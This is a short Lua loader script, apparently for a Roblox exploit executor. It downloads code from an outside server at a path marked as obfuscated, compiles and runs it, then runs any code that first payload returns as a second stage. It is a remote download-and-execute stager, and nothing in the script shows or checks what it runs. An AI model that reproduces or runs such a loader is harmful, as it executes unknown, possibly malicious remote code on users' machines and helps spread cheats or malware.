local url = "https://auth.syscure.vip/obf/341f8b0f879c6e1885d58816f960d178.lua"
local func, err = loadstring(game:HttpGetAsync(url))
if func then
    local success, result = pcall(func)
    if not success then
        print("Runtime error: " .. tostring(result))
    elseif result then
        local inner, innerErr = loadstring(result)
        if inner then
            local ok, innerResult = pcall(inner)
            if not ok then
                print("Inner runtime error: " .. tostring(innerResult))
            end
        else
            print("Failed to compile inner code: " .. tostring(innerErr))
        end
    end
else
    print("Failed to compile code: " .. tostring(err))
end
